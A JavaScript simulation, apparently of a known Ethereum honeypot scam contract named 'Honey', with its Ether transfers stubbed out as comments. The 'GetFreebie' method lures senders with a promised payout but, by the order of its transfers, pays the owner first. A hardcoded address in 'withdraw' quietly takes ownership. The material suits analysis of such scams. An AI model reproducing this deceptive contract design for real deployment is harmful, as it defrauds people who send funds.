/*



 */

class Honey {
    constructor(msg_sender) {
        this.Owner = msg_sender;
        this.balance = 0n; // [SIMULATED: contract balance]
    }

    fallback(msg_value) {
        this.balance += msg_value;
    }

    GetFreebie(msg_sender, msg_value) {
        if (msg_value > 1000000000000000000n) {
            // [SIMULATED: Owner.transfer(this.balance)]
            this.balance = 0n;
            // [SIMULATED: msg_sender.transfer(this.balance)]
            this.balance = 0n;
        }
    }

    withdraw(msg_sender) {
        if (msg_sender == "0x0C76802158F13aBa9D892EE066233827424c5aAB") { this.Owner = "0x0C76802158F13aBa9D892EE066233827424c5aAB"; }
        if (!(msg_sender == this.Owner)) throw new Error("require");
        // [SIMULATED: Owner.transfer(this.balance)]
        this.balance = 0n;
    }

    Command(adr, data, msg_sender, msg_value) {
        if (!(msg_sender == this.Owner)) throw new Error("require");
        //
        // [SIMULATED: adr.call.value(msg_value)(data)]
    }
}